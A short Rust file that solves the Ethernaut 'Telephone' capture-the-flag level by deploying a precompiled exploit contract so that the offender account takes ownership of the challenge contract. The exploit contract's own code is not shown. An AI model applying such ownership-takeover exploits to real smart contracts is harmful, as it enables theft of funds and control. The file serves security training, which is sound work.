//! Ethernaut 04 — Telephone.
//!
//! Goal: Make your offender account the owner of the `Telephone` contract.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Telephone.sol

use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl04_telephone::*;

pub struct Exploit;

alloy::sol!(
    #[allow(missing_docs)]
    #[sol(rpc)]
    TelephoneExploit,
    "out/TelephoneExploit.sol/TelephoneExploit.json"
);

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let _ = TelephoneExploit::deploy(offender.provider(), target.address)
            .await?;

        Ok(())
    }
}
